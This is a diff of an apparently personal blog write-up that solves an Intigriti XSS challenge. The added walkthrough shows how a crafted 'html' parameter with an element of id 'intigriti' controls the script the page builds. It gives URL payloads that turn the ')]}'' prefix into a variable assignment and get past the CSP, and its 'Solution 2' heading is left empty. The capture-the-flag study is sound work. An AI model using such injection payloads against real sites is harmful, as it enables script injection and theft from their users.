@@ -125,7 +125,7 @@ To have a quick check for `strict-dynamic`, we can try compare with and without 
 </html>
 ```
 
-As we can observe, only the XSS in the first Proof of Concept (POC) will be executed successfully, whereas the second one will be prevented from executing due to the Content Security Policy (CSP).. We will come back to this topic in the solution part later.
+As we can observe, only the XSS in the first Proof of Concept (POC) will be executed successfully, whereas the second one will be prevented from executing due to the Content Security Policy (CSP). We will come back to this topic in the solution part later.
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_6.png)
 
@@ -176,6 +176,61 @@ Since the parameter `xss` was not provided, the value of `e` will be `null`. The
 So now we know the parameter `xss` will be a useful for us to get an XSS. 
 
 ### Walkthrough Solution
+
+We now have two parameters that we can use `html` and `xss`.  Just now we only manage to to append characters/payload after the value `)]}'` in variable `e`.  But, in the snippet code below we found out that variable `f` will be append before the variable `e`. 
+
+```html
+<script nonce="afedac0a9a5507ad03f76ca4f5d76a81">
+----[snip]----
+c = document.getElementById("body").lastElementChild;
+if (c.id === "intigriti") {
+  l = c.lastElementChild;
+  i = l.innerHTML.trim();
+  f = i.substr(i.length - 4);
+  e = f + e;
+}
+----[snip]----
+</script>
+```
+
+Let's try insert a simple payload with id `intigriti`
+
+```cs
+?html=</h1></div><div id="intigriti"><script></div&xss=xss
+```
+
+The variable `f` will contain the value **"tml>"** after using the **substr()** function to retrieve the last four characters from the variable `i`.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_7.png)
+
+The final value that can be obtained from  `document.createElement("script")` s as follows.
+
+```html
+<script type="text/javascript">tml>)]}'xss</script>
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_8.png)
+
+Since we can manipulate the 4 characters. There are 2 ways that we can try and what I observe from other references too.
+
+- Make the value stored into a variable. Example: `a=')]}'`
+- Ensure the value `)]}'` will not causing any errors even without storing it.
+
+#### Solution 1
+
+The first solution we want to try store it into a varialble. Luckily, all the tag will auto closed. So let's just focus on the tag that could have single quote ('). The payload that we can try as follows:
+
+```html
+?html=</h1></div><div id="intigriti"><dd><a='><script>&xss=xss
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_9.png)
+
+
+
+#### Solution 2
+
+
 
 ## References
 
